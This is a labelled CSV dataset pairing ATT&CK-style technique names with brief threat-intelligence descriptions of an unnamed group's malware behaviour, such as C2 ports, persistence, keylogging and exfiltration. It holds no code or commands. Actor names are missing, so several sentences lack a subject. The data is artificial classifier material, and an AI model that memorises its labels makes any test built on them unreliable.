name,description,label 
Data from Removable Media,had a module in its malware to find encrypt and upload files from fixed and removable drives.,relationship
Scheduled Task,used scheduled tasks for persistence.,relationship
Standard Cryptographic Protocol,has relied on TLS-encrypted FTP to transfer data out of target environments. ,relationship
Malicious File,has has relied on users opening malicious attachments delivered through spearphishing to execute malware.,relationship
Web Protocols,malware used Pythons urllib library to make HTTP requests to the C2 server.,relationship
Malicious Link,has has relied on users opening malicious links delivered through spearphishing to execute malware.,relationship
Fast Flux DNS,has used free dynamic DNS domains for C2.,relationship
Commonly Used Port,malware has communicated with C2 servers over port 6667 (for IRC) and port 8080.,relationship
File and Directory Discovery,malware can list a victim's logical drives and the type as well the total/free space of the fixed devices. Other malware can list a directory's contents.,relationship
Ingress Tool Transfer,has downloaded additional code and files from servers onto victims.  used Wrapper/Gholee custom-developed malware which downloaded additional malware to the infected system.,relationship
Visual Basic,malware has used VBS scripts for execution.,relationship
Local Email Collection,has collected .PST archives.,relationship
Windows Command Shell,has used the command-line interface.,relationship
System Owner/User Discovery,malware has obtained the victim username and sent it to the C2 server.,relationship
System Network Configuration Discovery,malware gathers the victim's local IP address MAC address and external IP address.,relationship
Obfuscated Files or Information,malware has used base64-encoded commands and files and has also encrypted embedded strings with AES.,relationship
System Information Discovery,malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version UUID and computer/host name to send to the C2 server.,relationship
Uncommonly Used Port,malware has communicated with its C2 server over ports 4443 and 3543.,relationship
Archive via Utility,has used RAR to stage and compress local folders.,relationship
Registry Run Keys / Startup Folder,malware has used Registry Run keys to establish persistence.,relationship
PowerShell,has used PowerShell for execution and privilege escalation.,relationship
File Deletion,has deleted and overwrote files to cover tracks.,relationship
Process Discovery,malware can list running processes.,relationship
Spearphishing Link,sent shortened URL links over email to victims. The URLs linked to Word documents with malicious macros that execute PowerShells scripts to download Pupy.,relationship
Bidirectional Communication,malware can use a SOAP Web service to communicate with its C2 server.,relationship
Web Protocols,malware has used HTTP for C2.,relationship
Keylogging,malware is capable of keylogging.  used CWoolger and MPK custom-developed malware which recorded all keystrokes on an infected system.,relationship
